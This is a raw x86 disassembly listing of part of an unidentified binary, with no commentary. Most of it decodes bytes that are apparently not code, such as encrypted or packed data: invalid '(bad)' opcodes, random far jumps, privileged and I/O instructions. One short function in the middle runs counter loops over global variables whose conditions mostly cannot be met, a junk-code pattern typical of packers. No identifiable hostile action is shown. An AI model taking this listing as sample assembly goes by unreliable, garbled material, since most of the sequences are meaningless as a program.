  4069ab:	mov    esp,0xe176c425
  4069b0:	jecxz  0x406939
  4069b2:	loope  0x4069a6
  4069b4:	iret   
  4069b5:	inc    eax
  4069b6:	mov    ebx,0x34f163ba
  4069bb:	or     ecx,DWORD PTR [edx-0x59188254]
  4069c1:	ds mov ecx,0xcc9132e
  4069c7:	jecxz  0x40695f
  4069c9:	mov    dl,0x85
  4069cb:	fsub   QWORD PTR [ebx-0x61]
  4069ce:	or     dl,dh
  4069d0:	icebp  
  4069d1:	or     ebp,DWORD PTR [esi+0x1f]
  4069d4:	jg     0x406996
  4069d6:	(bad)  
  4069d7:	jmp    0x8fc3:0x4cdfa56d
  4069de:	ret    0x811
  4069e1:	adc    eax,0x8737bed2
  4069e6:	nop
  4069e7:	cs push 0x69e2fb2d
  4069ed:	ror    esp,cl
  4069ef:	mov    edi,0xfc6b613d
  4069f4:	es test dl,bl
  4069f7:	xor    al,0xf2
  4069f9:	lea    esp,[edx-0x3]
  4069fc:	adc    ch,0xc5
  4069ff:	int3   
  406a00:	scas   eax,DWORD PTR es:[edi]
  406a01:	jbe    0x40699e
  406a03:	mov    edx,0xbf65fa23
  406a08:	ss jle 0x406a51
  406a0b:	stos   DWORD PTR es:[edi],eax
  406a0c:	fs loop 0x4069a7
  406a0f:	mov    bl,0xa4
  406a11:	fcom   QWORD PTR [edi-0x6b]
  406a14:	xchg   ebx,eax
  406a15:	mov    esi,0x70ada9b6
  406a1a:	mov    DWORD PTR [edi],eax
  406a1c:	idiv   DWORD PTR [ebx-0x6ddb2680]
  406a22:	cld    
  406a23:	data16 fsqrt 
  406a26:	arpl   WORD PTR [edi+0x439db6a1],ax
  406a2c:	sahf   
  406a2d:	stos   BYTE PTR es:[edi],al
  406a2e:	mov    ds:0xc6194970,al
  406a33:	int    0x95
  406a35:	stc    
  406a36:	imul   ecx,esi,0x4bbcfd15
  406a3c:	mov    BYTE PTR [edx-0x6e],ah
  406a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a40:	and    BYTE PTR [edx],bh
  406a42:	inc    edx
  406a43:	inc    eax
  406a44:	imul   DWORD PTR [ecx]
  406a46:	fcmovb st,st(4)
  406a48:	pop    ss
  406a49:	mov    eax,0x2818ce80
  406a4e:	pop    eax
  406a4f:	mov    ch,0x97
  406a51:	imul   esp,DWORD PTR [edi],0x7d19b186
  406a57:	xor    DWORD PTR [eax],ebx
  406a59:	sahf   
  406a5a:	pop    esp
  406a5b:	aad    0x7c
  406a5d:	(bad)  ds:0xe9a03c7e
  406a63:	jle    0x406a69
  406a65:	mov    ?,WORD PTR [ebx]
  406a67:	mov    edx,0x33a9777e
  406a6c:	out    dx,eax
  406a6d:	(bad)  
  406a6e:	adc    al,0xec
  406a70:	jae    0x406a79
  406a72:	fstp   QWORD PTR [edi]
  406a74:	inc    eax
  406a75:	ins    BYTE PTR es:[edi],dx
  406a76:	loop   0x406a7e
  406a78:	or     al,0xb2
  406a7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a7b:	xor    bl,BYTE PTR [ecx]
  406a7d:	ds mov eax,0x75bc90ac
  406a83:	aas    
  406a84:	pushf  
  406a85:	stc    
  406a86:	adc    eax,0xdec8417
  406a8b:	adc    DWORD PTR ds:0x55e667c3,edi
  406a91:	enter  0xccf2,0x32
  406a95:	sub    ebx,DWORD PTR [eax+0x508e3a96]
  406a9b:	ins    BYTE PTR es:[edi],dx
  406a9c:	jbe    0x406a32
  406a9e:	cmp    DWORD PTR [ebx-0x1173350a],ecx
  406aa4:	pop    eax
  406aa5:	out    dx,eax
  406aa6:	iret   
  406aa7:	adc    bh,BYTE PTR [ebx]
  406aa9:	mul    BYTE PTR [ebp+0x673eafd4]
  406aaf:	call   DWORD PTR [ebp+0x27625e4]
  406ab5:	mov    ch,0xf6
  406ab7:	xor    eax,0xc400cac4
  406abc:	call   0x5c1:0x3375842d
  406ac3:	pushf  
  406ac4:	jb     0x406af8
  406ac6:	add    cl,cl
  406ac8:	ret    0x1c
  406acb:	push   ebp
  406acc:	mov    ebp,esp
  406ace:	sub    esp,0x78
  406ad1:	mov    eax,ds:0x41b1a8
  406ad6:	mov    DWORD PTR [ebp-0x10],eax
  406ad9:	mov    eax,ds:0x41b2b4
  406ade:	sub    DWORD PTR ds:0x42e6fb,0x487f
  406ae8:	mov    DWORD PTR [ebp-0x30],eax
  406aeb:	xor    DWORD PTR ds:0x42fd01,0x6d44
  406af5:	mov    DWORD PTR [ebp-0xc],0xf89c8531
  406afc:	inc    DWORD PTR ds:0x42fcd9
  406b02:	mov    DWORD PTR [ebp-0x14],0xf89c8530
  406b09:	sub    DWORD PTR ds:0x42e6ef,0x7e8e
  406b13:	mov    eax,DWORD PTR [ebp-0xc]
  406b16:	push   ebx
  406b17:	push   esi
  406b18:	push   edi
  406b19:	movzx  esi,WORD PTR ds:0x42fcd9
  406b20:	and    esi,DWORD PTR ds:0x42e128
  406b26:	mov    DWORD PTR ds:0x42fcd9,esi
  406b2c:	mov    esi,0x7510855
  406b31:	mov    DWORD PTR ds:0x42e6f3,0x1a
  406b3b:	cmp    DWORD PTR ds:0x42e6f3,0x0
  406b42:	je     0x406c66
  406b48:	cmp    DWORD PTR ds:0x42e6f3,0x27
  406b4f:	jne    0x406b61
  406b55:	push   DWORD PTR [ebp-0xc]
  406b58:	push   DWORD PTR [ebp-0x24]
  406b5b:	call   DWORD PTR ds:0x42e2df
  406b61:	mov    edi,DWORD PTR ds:0x42e6f3
  406b67:	dec    edi
  406b68:	mov    DWORD PTR ds:0x42e6f3,edi
  406b6e:	jmp    0x406b3b
  406b73:	mov    DWORD PTR ds:0x42fcf1,0x10
  406b7d:	cmp    DWORD PTR ds:0x42fcf1,0x0
  406b84:	je     0x406c66
  406b8a:	cmp    DWORD PTR ds:0x42fcf1,0x1c
  406b91:	jne    0x406bad
  406b97:	push   DWORD PTR [ebp-0x10]
  406b9a:	push   0x42fcfd
  406b9f:	push   0x29f4
  406ba4:	push   DWORD PTR [ebp-0x14]
  406ba7:	call   DWORD PTR ds:0x42e53f
  406bad:	mov    edi,DWORD PTR ds:0x42fcf1
  406bb3:	dec    edi
  406bb4:	mov    DWORD PTR ds:0x42fcf1,edi
  406bba:	jmp    0x406b7d
  406bbf:	and    DWORD PTR ds:0x42fce5,0x0
  406bc9:	jmp    0x406bdb
  406bce:	mov    edi,DWORD PTR ds:0x42fce5
  406bd4:	inc    edi
  406bd5:	mov    DWORD PTR ds:0x42fce5,edi
  406bdb:	cmp    DWORD PTR ds:0x42fce5,0x15
  406be2:	jae    0x406c66
  406be8:	cmp    DWORD PTR ds:0x42fce5,0x1e
  406bef:	jne    0x406c06
  406bf5:	push   DWORD PTR [ebp-0xc]
  406bf8:	push   0x42fced
  406bfd:	push   DWORD PTR [ebp-0x10]
  406c00:	call   DWORD PTR ds:0x42e45b
  406c06:	jmp    0x406bce
  406c0b:	and    DWORD PTR ds:0x42fd76,0x0
  406c15:	mov    edi,DWORD PTR ds:0x42fd76
  406c1b:	inc    edi
  406c1c:	mov    DWORD PTR ds:0x42fd76,edi
  406c22:	cmp    DWORD PTR ds:0x42fd76,0x5
  406c29:	jne    0x406c3f
  406c2f:	push   0x42e707
  406c34:	push   0x42e1a4
  406c39:	call   DWORD PTR ds:0x42e543
  406c3f:	cmp    DWORD PTR ds:0x42fd76,0x4
  406c46:	jne    0x406c59
  406c4c:	mov    edi,DWORD PTR ds:0x42fd76
  406c52:	inc    edi
  406c53:	mov    DWORD PTR ds:0x42fd76,edi
  406c59:	cmp    DWORD PTR ds:0x42fd76,0x1b
  406c60:	jb     0x406c15
  406c66:	xor    eax,esi
  406c68:	sub    DWORD PTR ds:0x42e713,ecx
  406c6e:	mov    edi,0x32729c
  406c73:	add    eax,edi
  406c75:	xor    DWORD PTR ds:0x42e70b,0x42fd76
  406c7f:	mov    DWORD PTR [ebp-0x20],eax
  406c82:	mov    DWORD PTR [ebp-0x28],0xf89cb531
  406c89:	jmp    0x406fd6
  406c8e:	inc    ecx
  406c8f:	jae    0x406d0b
  406c91:	pop    ebp
  406c92:	sub    dh,BYTE PTR [ebp+0x61]
  406c95:	jae    0x406ce4
  406c97:	and    ebp,DWORD PTR [eax]
  406c99:	mov    bh,0x6
  406c9b:	lods   al,BYTE PTR ds:[esi]
  406c9c:	push   ecx
  406c9d:	(bad)  
  406c9e:	pop    ss
  406c9f:	lds    esi,FWORD PTR [eax+0x70]
  406ca2:	and    BYTE PTR [ebp+0x70],bh
  406ca5:	jo     0x406ce5
  406ca7:	push   eax
  406ca8:	dec    edx
  406ca9:	jl     0x406d1e
  406cab:	push   esi
  406cac:	mov    dh,0xba
  406cae:	mov    al,0xd0
  406cb0:	(bad)  
  406cb1:	loopne 0x406c8c
  406cb3:	inc    edx
  406cb4:	(bad)  
  406cb5:	aad    0x54
  406cb7:	sti    
  406cb8:	es pop ecx
  406cba:	popf   
  406cbb:	stc    
  406cbc:	adc    DWORD PTR [ebx+0x4158c641],esi
  406cc2:	in     al,0xb9
  406cc4:	jb     0x406c8f
  406cc6:	sar    BYTE PTR [ebx+0x6c97b380],cl
  406ccc:	ins    DWORD PTR es:[edi],dx
  406ccd:	sar    DWORD PTR [edi],1
  406ccf:	jl     0x406ce1
  406cd1:	jnp    0x406c55
  406cd3:	push   ds
  406cd4:	mov    ah,0x15
  406cd6:	loop   0x406c61
  406cd8:	sti    
  406cd9:	xor    esi,DWORD PTR [ebx]
  406cdb:	stos   BYTE PTR es:[edi],al
  406cdc:	and    edi,edi
  406cde:	pusha  
  406cdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ce1:	repz pop esi
  406ce3:	push   edx
  406ce4:	and    eax,0x8a6c6d6e
  406ce9:	outs   dx,DWORD PTR ds:[esi]
  406cea:	push   0xaad17107
  406cef:	ins    BYTE PTR es:[edi],dx
  406cf0:	aaa    
  406cf1:	pop    ebp
  406cf2:	inc    edx
  406cf3:	and    al,BYTE PTR [ecx+0x5a]
  406cf6:	cmp    eax,DWORD PTR [edi+ebx*8-0x5954f0f0]
  406cfd:	adc    edi,DWORD PTR [edx-0x6abd6805]
  406d03:	cmp    DWORD PTR [esi],0x5b180697
  406d09:	mov    cl,0xd5
  406d0b:	in     al,0x2
  406d0d:	cmp    dl,BYTE PTR [ecx]
  406d0f:	ds loopne 0x406d3c
  406d12:	outs   dx,DWORD PTR ds:[esi]
  406d13:	cld    
  406d14:	sbb    eax,0x967d76f
  406d19:	and    esi,DWORD PTR [eax+0x5d7f3741]
  406d1f:	sbb    ebx,0x71
  406d22:	rcr    BYTE PTR [esi-0x5fd2c8b6],0xbc
  406d29:	and    ebx,ecx
  406d2b:	adc    eax,0xb5178fc9
  406d30:	push   edi
  406d31:	(bad)  
  406d32:	or     bh,BYTE PTR [edx]
  406d34:	jmp    0x90bf:0x8f333aaa
  406d3b:	sub    DWORD PTR cs:[eax+0x60c8a338],esp
  406d42:	gs mov ebp,0xb19df1b9
  406d48:	cmp    esi,edx
  406d4a:	xchg   ebp,eax
  406d4b:	fisub  DWORD PTR [ebx-0x38715cc0]
  406d51:	out    0x6b,eax
  406d53:	pop    ebx
  406d54:	xor    al,0xba
  406d56:	mov    edi,DWORD PTR [esi+edi*1]
  406d59:	fld    TBYTE PTR [esi]
  406d5b:	popf   
  406d5c:	xor    DWORD PTR [edi+eiz*1+0x2c],esi
  406d60:	mov    ebx,0x8db8b1e7
  406d65:	ret    0x4364
  406d68:	and    eax,0x172684e5
  406d6d:	test   al,0x71
  406d6f:	xor    al,0x31
  406d71:	jbe    0x406df0
  406d73:	jne    0x406d48
  406d75:	dec    ebx
  406d76:	out    dx,al
  406d77:	sub    DWORD PTR [ebx+0x7dabbb81],eax
  406d7d:	mov    ds:0xdf85b6f7,eax
  406d82:	mov    ch,0xd7
  406d84:	adc    ebx,esp
  406d86:	mov    dh,0x3b
  406d88:	int3   
  406d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d8a:	inc    ebx
  406d8b:	and    BYTE PTR [ebx+0xa8b1249],cl
  406d91:	ins    BYTE PTR es:[edi],dx
  406d92:	adc    al,BYTE PTR [eax+0x4abdbd82]
  406d98:	sub    eax,0xaeff02b5
  406d9d:	pop    edx
  406d9e:	jae    0x406dde
  406da0:	xchg   edx,eax
  406da1:	or     al,0x15
  406da3:	iret   
  406da4:	sbb    eax,0xab91a91d
  406da9:	jo     0x406dd4
  406dab:	sbb    edx,esp
  406dad:	icebp  
  406dae:	fnstenv [ebx+ebp*4-0x6f36e1ea]
  406db5:	test   al,0x5e
  406db7:	pop    esp
  406db8:	std    
  406db9:	call   0x21e9b413
  406dbe:	inc    ebx
  406dbf:	mov    WORD PTR [edi-0x6a89a9e9],fs
  406dc5:	sbb    dh,BYTE PTR [eax]
  406dc7:	dec    edi
  406dc8:	mov    dh,0x18
  406dca:	icebp  
  406dcb:	daa    
  406dcc:	pop    ebp
  406dcd:	inc    esp
  406dce:	or     DWORD PTR ds:0x8607fef0,edi
  406dd4:	icebp  
  406dd5:	lahf   
  406dd6:	inc    ecx
  406dd7:	sar    DWORD PTR [eax+0x443f8b19],1
  406ddd:	xor    al,0xd6
  406ddf:	pop    ds
  406de0:	test   BYTE PTR ds:0x5481ed54,0x39
  406de7:	cli    
  406de8:	int3   
  406de9:	icebp  
  406dea:	sub    al,0x74
  406dec:	in     eax,dx
  406ded:	sti    
  406dee:	dec    eax
  406def:	(bad)
  406df2:	call   0xa4443c3f
  406df7:	dec    ebp
  406df8:	or     BYTE PTR [eax-0xce90e9],bh
  406dfe:	dec    BYTE PTR [edi]
  406e00:	mov    ebx,?
  406e02:	test   al,0x1
  406e04:	retf   
  406e05:	mov    al,0x90
  406e07:	fadd   QWORD PTR [edx+eax*2+0x4a]
  406e0b:	xor    cl,al
  406e0d:	sub    BYTE PTR [eax],ah
  406e0f:	pusha  
  406e10:	or     ebp,esi
  406e12:	mov    ebp,0xe5fc1fa6
  406e17:	pop    es
  406e18:	jne    0x406dcd
  406e1a:	mov    dh,0xfb
  406e1c:	sub    al,0xe0
  406e1e:	or     eax,0xd8897cac
  406e23:	push   edx
  406e24:	mov    edx,0x6ecba6c6
  406e29:	mov    bh,0x70
  406e2b:	dec    ebp
  406e2c:	cmp    esp,DWORD PTR [edi-0x63]
  406e2f:	xchg   BYTE PTR [edi],bh
  406e31:	(bad)  
  406e32:	dec    ebp
  406e33:	ins    DWORD PTR es:[edi],dx
  406e34:	dec    esp
  406e35:	mov    BYTE PTR [ebx+edx*4+0x39a4afec],ah
  406e3c:	test   BYTE PTR [ebx-0x3],bl
  406e3f:	xchg   esp,eax
  406e40:	mov    ebx,0x6c22a68
  406e45:	xchg   esp,eax
  406e46:	(bad)  
  406e47:	(bad)  
  406e48:	stos   BYTE PTR es:[edi],al
  406e49:	xor    al,0xa1
  406e4b:	dec    ebx
  406e4c:	lds    ebx,FWORD PTR [ecx-0x42555f18]
  406e52:	pop    edi
  406e53:	jp     0x406e90
  406e55:	pop    ds
  406e56:	sub    DWORD PTR ds:0x57829651,edx
  406e5c:	cmp    DWORD PTR [ebp+edi*2-0x80],eax
  406e60:	adc    cl,BYTE PTR [edx-0xcee7e26]
  406e66:	pop    edx
  406e67:	aad    0x19
  406e69:	mov    dl,0xdf
  406e6b:	mov    ds:0x1a1f5e76,al
  406e70:	jne    0x406eaa
  406e72:	stc    
  406e73:	dec    esi
  406e74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e75:	sub    BYTE PTR [edi+0x12],ch
  406e78:	(bad)  
  406e79:	inc    edx
  406e7a:	cmp    esp,DWORD PTR [edi]
  406e7c:	pop    ecx
  406e7d:	push   ebp
  406e7e:	les    ebp,FWORD PTR [esi]
  406e80:	or     BYTE PTR [eax+ebp*4-0x1456ed0a],dh
  406e87:	or     esp,esi
  406e89:	push   edx
  406e8a:	test   eax,0xac96bed0
  406e8f:	leave  
  406e90:	adc    BYTE PTR [esi],ah
  406e92:	pop    esi
  406e93:	jecxz  0x406e6f
  406e95:	jle    0x406eda
  406e97:	dec    esi
  406e98:	(bad)
  406e9b:	jg     0x406e28
  406e9d:	loop   0x406e71
  406e9f:	mov    dl,0x20
  406ea1:	fist   WORD PTR [esi-0x3]
  406ea4:	ficom  WORD PTR [edx+edx*8-0x59]
  406ea8:	jno    0x406e94
  406eaa:	pop    esi
  406eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406eac:	fwait
  406ead:	or     eax,ecx
  406eaf:	je     0x406ec8
  406eb1:	sub    esi,DWORD PTR [ebp+0x2c]
  406eb4:	adc    ecx,DWORD PTR [eax-0x4e]
  406eb7:	dec    ebp
  406eb8:	adc    eax,0x6065ba2e
  406ebd:	sbb    edx,DWORD PTR [edx+0x3c]
  406ec0:	fs mov ch,0xf0
  406ec3:	push   0xffffffed
  406ec5:	into   
  406ec6:	loope  0x406e5d
  406ec8:	add    DWORD PTR [ecx+0x50],edi
  406ecb:	push   es
  406ecc:	xchg   edi,eax
  406ecd:	ins    BYTE PTR es:[edi],dx
  406ece:	push   0x3f
  406ed0:	aas    
  406ed1:	mov    ebp,0x4940101c
  406ed6:	ja     0x406f26
  406ed8:	repnz lods al,BYTE PTR ds:[esi]
  406eda:	fbld   TBYTE PTR [edx+0x73622b66]
  406ee0:	xchg   BYTE PTR [esi+0x4c5fb988],bh
  406ee6:	sub    eax,0xd4b4573f
  406eeb:	sbb    eax,0x8fb60f92
  406ef0:	mov    bl,0x6f
  406ef2:	sub    eax,0x4ab45f0e
  406ef7:	lea    ebp,[eax+eax*2+0xb]
  406efb:	mov    esi,0xee28e790
  406f00:	xchg   edx,eax
  406f01:	mov    al,ds:0xc84d3c3b
  406f06:	je     0x406f00
  406f08:	ja     0x406f3a
  406f0a:	jns    0x406f67
  406f0c:	cwde   
  406f0d:	mov    cl,BYTE PTR [ebp+0xf2186fa]
  406f13:	dec    ebx
  406f14:	lea    eax,[ebp+0x14c2d78f]
  406f1a:	inc    eax
  406f1b:	(bad)  
  406f1c:	jns    0x406ef1
  406f1e:	stos   BYTE PTR es:[edi],al
  406f1f:	ret    
  406f20:	inc    eax
  406f21:	test   al,0xc7
  406f23:	mov    esp,0x68f4477e
  406f28:	or     DWORD PTR [eax-0xb80ad4e],ebp
  406f2e:	dec    eax
  406f2f:	mov    ds:0x9cbfb7f7,al
  406f34:	adc    al,0x2e
  406f36:	mov    cl,0xec
  406f38:	lds    esi,FWORD PTR ss:[ebx]
  406f3b:	or     esi,DWORD PTR [ebx]
  406f3d:	leave  
  406f3e:	mov    es,WORD PTR [ebp+0x101225d6]
  406f44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f45:	lods   al,BYTE PTR ds:[esi]
  406f46:	mov    esp,edx
  406f48:	or     edx,DWORD PTR [edi+0x4b]
  406f4b:	mov    esi,0xdf55476
  406f50:	data16 std 
  406f52:	cmp    eax,0x61463e1d
  406f57:	outs   dx,DWORD PTR ds:[esi]
  406f58:	(bad)  
  406f59:	xchg   esi,eax
  406f5a:	mov    BYTE PTR [ebx-0x63f19fd2],dh
  406f60:	jmp    DWORD PTR [esi]
  406f62:	inc    edi
  406f63:	ret    
  406f64:	jecxz  0x406f30
  406f66:	and    DWORD PTR [ebx+0x63],ebp
  406f69:	loopne 0x406f6f
  406f6b:	and    BYTE PTR [esi+0x10db819d],ch
  406f71:	xchg   BYTE PTR [ebx],bl
  406f73:	cdq    
  406f74:	cmp    BYTE PTR [ebx-0x62caab35],0x2a
  406f7b:	inc    esi
  406f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f7d:	mov    eax,0xfd33e8ee
  406f82:	cmp    al,0x45
  406f84:	mov    DWORD PTR [esi+0x41],edi
  406f87:	jno    0x406fda
  406f89:	sub    ebx,DWORD PTR [edi]
  406f8b:	adc    al,0x4c
  406f8d:	inc    edi
  406f8e:	pop    esp
  406f8f:	or     BYTE PTR [esi+0x221a9ad7],dh
  406f95:	je     0x407016
  406f97:	xor    eax,0xdb74dc90
  406f9c:	repnz push ds
  406f9e:	dec    ebx
  406f9f:	shl    DWORD PTR [ebp+0x2d],0xa0
  406fa3:	scas   al,BYTE PTR es:[edi]
  406fa4:	or     eax,edx
  406fa6:	ror    BYTE PTR [ecx],1
  406fa8:	cmp    DWORD PTR [ecx-0x642d3c1b],ecx
  406fae:	ficom  WORD PTR [ebp+ecx*8-0x18]
  406fb2:	shr    BYTE PTR [eax-0x123e0aa7],1
  406fb8:	xchg   ebx,eax
  406fb9:	(bad)  
  406fba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406fbb:	and    DWORD PTR [esi-0x11939138],ecx
  406fc1:	pop    ds
  406fc2:	mov    esp,0xc16ce9b9
  406fc7:	dec    esi
  406fc8:	or     esi,ebx
  406fca:	mov    ds:0x1ccf0234,al
  406fcf:	cmp    BYTE PTR [ecx+0x46],bh
  406fd2:	js     0x406f58
  406fd4:	les    ebp,FWORD PTR [eax+0x31cc45c7]
  406fda:	add    eax,0x1581f89f
  406fdf:	jb     0x406fde
  406fe1:	inc    edx
  406fe2:	add    BYTE PTR [ebx],cl
  406fe4:	out    0x42,eax
  406fe6:	add    bh,al
  406fe8:	inc    ebp
  406fe9:	aam    0xf1
  406feb:	test   DWORD PTR [eax+edi*8-0x2e23ba39],ebx
  406ff2:	test   DWORD PTR [eax+edi*8+0xac05],ebx
  406ff9:	add    cl,ch
  406ffb:	dec    eax
  406ffc:	add    eax,DWORD PTR [eax]
  406ffe:	add    BYTE PTR [esi*2+0x5a51bed1],bl
  407005:	mov    bl,0x71
  407007:	lahf   
  407008:	popa   
  407009:	sti    
  40700a:	arpl   WORD PTR [edx],dx
  40700c:	loope  0x406fde
  40700e:	push   0xffffffc7
  407010:	ret    0x7070
  407013:	and    BYTE PTR [ebp+0x70],bh
  407016:	jo     0x40702d
  407018:	mov    ds,edi
  40701a:	push   ebx
  40701b:	lahf   
  40701c:	shr    BYTE PTR [ecx-0xe47c7f8],0x95
  407023:	lock hlt 
  407025:	cs ret 
  407027:	sub    al,0xdb
  407029:	hlt    
  40702a:	dec    edx
  40702b:	xor    bh,BYTE PTR [edi+0x2c5a70a3]
  407031:	repz iret 
  407033:	stos   DWORD PTR es:[edi],eax
  407034:	shr    DWORD PTR [ecx-0x75],0x2d
  407038:	adc    eax,0x80cdea3a
  40703d:	xchg   edx,eax
  40703e:	ja     0x407083
  407040:	jo     0x406feb
  407042:	(bad)  [ebp-0x7a7f2ac3]
  407048:	imul   edi,DWORD PTR [esi-0x65400ab9],0xffffffe1
  40704f:	inc    ebp
  407050:	mov    ds:0x7342ee05,al
  407055:	frstpm(287 only) 
  407057:	lds    esi,FWORD PTR [ecx]
  407059:	out    0xd2,al
  40705b:	add    BYTE PTR [esi],dh
  40705d:	scas   eax,DWORD PTR es:[edi]
  40705e:	xchg   edx,eax
  40705f:	out    0xe7,al
  407061:	sub    edx,eax
  407063:	in     al,0xa7
  407065:	and    ah,BYTE PTR ds:0x892912e8
  40706b:	pop    esi
  40706c:	jp     0x4070c1
  40706e:	or     eax,0xebb0c955
  407073:	ins    DWORD PTR es:[edi],dx
  407074:	pop    DWORD PTR [ebp-0x4e2c4b58]
  40707a:	aas    
  40707b:	aaa    
  40707c:	inc    ebp
  40707d:	xor    BYTE PTR [edx+0x43],dl
  407080:	and    DWORD PTR [ecx+eiz*8+0x63e7f4b],esp
  407087:	push   0xc757a041
  40708c:	mov    ds:0xcf2174a7,eax
  407091:	mov    ds:0x46747b28,al
  407096:	pop    ecx
  407097:	xor    cl,bl
  407099:	aaa    
  40709a:	push   ss
  40709b:	loopne 0x4070ec
  40709d:	mov    ds:0x25f7aa39,eax
  4070a3:	xchg   edi,eax
  4070a4:	data16 fsub DWORD PTR ds:[edx+0x42]
  4070a9:	fld    DWORD PTR ds:0x5ac03979
  4070af:	xor    DWORD PTR [ecx+esi*1-0x6dcd34c3],ebx
  4070b6:	jno    0x4070d5
  4070b8:	bound  ebx,QWORD PTR [ecx+0x714079b3]
  4070be:	xchg   al,al
  4070c0:	aaa    
  4070c1:	xlat   BYTE PTR ds:[ebx]
  4070c2:	leave  
  4070c3:	dec    esp
  4070c4:	xor    eax,0xc4af3e69
  4070c9:	xor    eax,0x4955f161
  4070ce:	dec    eax
  4070cf:	pop    ebp
  4070d0:	add    dh,BYTE PTR [ebp-0x63]
  4070d3:	mov    al,ds:0x257bd3b6
  4070d8:	sub    eax,0x69326ec8
  4070dd:	in     al,0x7c
  4070df:	xor    BYTE PTR [eax-0x3af6e4ee],bl
  4070e5:	jmp    0x5caa4fd2
  4070ea:	sub    BYTE PTR [esi+0x54],dh
  4070ed:	sti    
  4070ee:	cdq    
  4070ef:	stc    
  4070f0:	dec    eax
  4070f1:	daa    
  4070f2:	ss ins DWORD PTR es:[edi],dx
  4070f4:	in     eax,dx
  4070f5:	out    0xff,al
  4070f7:	in     al,dx
  4070f8:	mov    bh,0x98
  4070fa:	mov    ds:0xe769a82b,eax
  4070ff:	mov    ds:0xf5b683db,eax
  407104:	fistp  WORD PTR [edx+0x63]
  407107:	mov    ah,cl
  407109:	jae    0x4070d5
  40710b:	cmp    DWORD PTR [edi+ebp*1+0x2a],edx
  40710f:	push   ebx
  407110:	gs lahf 
  407112:	cmp    DWORD PTR [eax+0x36cce2cc],eax
  407118:	push   ss
  407119:	int3   
  40711a:	mov    al,ah
  40711c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40711d:	push   esp
  40711e:	bound  eax,QWORD PTR [edx]
  407120:	int3   
  407121:	call   eax
  407123:	jl     0x407149
  407125:	xor    bh,BYTE PTR [edi+0x4a]
  407128:	scas   al,BYTE PTR es:[edi]
  407129:	sar    BYTE PTR [ecx-0x4e55e3aa],cl
  40712f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407130:	nop
  407131:	push   ebx
  407132:	fadd   QWORD PTR [esi]
  407134:	push   cs
  407135:	add    al,0xc3
  407137:	mov    ebp,0xbe10d8f
  40713c:	sub    DWORD PTR [ecx-0x2cc5685c],edi
  407142:	stc    
  407143:	jo     0x407144
  407145:	pop    ebp
  407146:	pushf  
  407147:	repz imul edx,DWORD PTR [esi-0x2e6f286f],0x9f968948
  407152:	pop    eax
  407153:	test   BYTE PTR ds:0xecb3c87c,dl
  407159:	icebp  
  40715a:	ss retf 0x8f34
  40715e:	cmp    al,0xf8
  407160:	mov    ds:0xede7befb,al
  407165:	lea    ecx,[edi+0x71]
  407168:	ja     0x4071e8
  40716a:	mov    ah,0xc0
  40716c:	inc    BYTE PTR [ebp+0x52]
  40716f:	shl    al,cl
  407171:	js     0x407171
  407173:	test   DWORD PTR [ebx],0x8c65f263
  407179:	imul   esi
  40717b:	push   ebx
  40717c:	pop    es
  40717d:	and    ebx,DWORD PTR [esp+esi*8+0x19]
  407181:	stos   DWORD PTR es:[edi],eax
  407182:	xor    BYTE PTR [edi+edx*1+0x55],ch
  407186:	or     eax,0x5678bbea
  40718b:	iret   
  40718c:	and    esp,DWORD PTR [edx-0x4839bc15]
  407192:	push   edx
  407193:	mov    ds:0x57cb21b2,eax
  407198:	test   eax,0xcf7ef99d
  40719d:	ins    BYTE PTR es:[edi],dx
  40719e:	jmp    0x1ee0:0x50772702
  4071a5:	xlat   BYTE PTR ds:[ebx]
  4071a6:	das    
  4071a7:	ins    BYTE PTR es:[edi],dx
  4071a8:	jmp    0x8087:0xbddb49ba
  4071af:	psubsb mm3,QWORD PTR [ebx+0x61]
  4071b3:	xchg   edi,eax
  4071b4:	fisttp WORD PTR [ebp-0x61c13f74]
  4071ba:	cmp    al,dl
  4071bc:	in     al,dx
  4071bd:	mov    ebx,ecx
  4071bf:	(bad)  
  4071c0:	ret    
  4071c1:	xor    DWORD PTR [ebx-0xde218af],ebp
  4071c7:	inc    edx
  4071c8:	aad    0xa5
  4071ca:	repnz and al,BYTE PTR [edx*2+0x316b1dc9]
  4071d2:	dec    ebp
  4071d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071d4:	mov    al,0x93
  4071d6:	mov    edi,ebp
  4071d8:	popa   
  4071d9:	jnp    0x407230
  4071db:	leave  
  4071dc:	inc    esp
  4071dd:	hlt    
  4071de:	ja     0x4071e6
  4071e0:	call   0xde96:0xcb6fd6fb
  4071e7:	cmovnp esi,DWORD PTR [edi]
  4071ea:	jecxz  0x40721f
  4071ec:	push   eax
  4071ed:	loope  0x407266
  4071ef:	jp     0x4071f2
  4071f1:	aad    0xc3
  4071f3:	adc    BYTE PTR [ecx],bh
  4071f5:	push   ecx
  4071f6:	inc    edi
  4071f7:	xor    DWORD PTR [ebp+0x49a1036a],ecx
  4071fd:	jecxz  0x4071d1
  4071ff:	add    al,0x2b
  407202:	cmc    
  407203:	loop   0x407186
  407205:	pop    ebx
  407206:	cdq    
  407207:	cmp    dl,BYTE PTR [eax]
  407209:	xor    bl,BYTE PTR [eax-0x7b]
  40720c:	rcl    BYTE PTR ds:0x73fef0ad,0xff
  407213:	mov    dh,0xb
  407215:	shl    DWORD PTR [ebp-0x43],cl
  407218:	push   eax
  407219:	outs   dx,BYTE PTR ds:[esi]
  40721a:	inc    esi
  40721b:	mov    WORD PTR [esi+0x78],gs
  40721e:	jl     0x407225
  407220:	or     BYTE PTR [edi-0x482643a6],bl
  407226:	test   eax,0xc223be9b
  40722b:	xchg   esi,eax
  40722c:	adc    eax,0x649c1cae
  407231:	rcl    ebp,cl
  407233:	inc    esp
  407234:	enter  0xac23,0x96
  407238:	(bad)  
  407239:	lock imul ebp,ebx,0x60
  40723d:	js     0x4071d8
